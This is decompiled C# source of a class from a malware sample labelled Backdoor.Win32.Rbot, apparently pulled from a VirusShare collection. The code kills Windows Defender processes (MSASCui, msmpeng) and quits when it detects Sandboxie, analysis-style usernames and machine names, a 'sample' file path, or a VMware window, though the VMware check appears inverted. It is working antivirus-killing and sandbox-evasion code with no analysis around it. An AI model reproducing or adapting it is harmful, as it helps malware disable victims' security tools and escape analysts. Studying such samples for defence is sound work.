// Decompiled with JetBrains decompiler
// Type: winini.ant
// Assembly: winini, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: FD868ADB-5E8B-4953-B148-111F95D9107A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Rbot.aea-ef6080aad9d1e3ba2cfa22aa47a04864378c6c5efe3f0aaeb6950168a7155625.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace winini
{
  public class ant
  {
    [DebuggerNonUserCode]
    public ant()
    {
    }

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    public static void mofo()
    {
      ant.seekit("MSASCui");
      ant.seekit("msmpeng");
      ant.antiSandboxie();
      ant.IsVmWare();
      ant.AntiThreatExpert();
      ant.checkUsername();
      ant.checkComputername();
    }

    private static void seekit(string gay1)
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        if (process.ProcessName.Contains(gay1))
        {
          try
          {
            process.Kill();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        checked { ++index; }
      }
    }

    private static void checkUsername()
    {
      List<string> stringList = new List<string>();
      stringList.Add("UserName");
      stringList.Add("User");
      stringList.Add("honey");
      stringList.Add("sandbox");
      stringList.Add("currentuser");
      stringList.Add("User");
      try
      {
        foreach (string Right in stringList)
        {
          if (Operators.CompareString(Environment.UserName, Right, false) == 0)
            Environment.Exit(0);
        }
      }
      finally
      {
        List<string>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }

    private static void checkComputername()
    {
      List<string> stringList = new List<string>();
      stringList.Add("ComputerName");
      stringList.Add("COMPUTERNAME");
      stringList.Add("DELL-D3E62F7E26");
      stringList.Add("DWI-9625AC2E275");
      stringList.Add("MICHAEL-F156CF7");
      try
      {
        foreach (string Right in stringList)
        {
          if (Operators.CompareString(Environment.MachineName, Right, false) == 0)
            Environment.Exit(0);
        }
      }
      finally
      {
        List<string>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }

    public static void antiSandboxie()
    {
      if (Process.GetProcessesByName("SbieSvc").Length < 1)
        return;
      Environment.Exit(0);
    }

    public static void IsVmWare()
    {
      string str1 = "VMDragDetectWndClass";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      if (ant.FindWindow(ref local1, ref local2) != 0L)
        return;
      Environment.Exit(0);
    }

    private static void AntiThreatExpert()
    {
      if (!Process.GetCurrentProcess().MainModule.FileName.Contains("sample"))
        return;
      Environment.Exit(0);
    }
  }
}
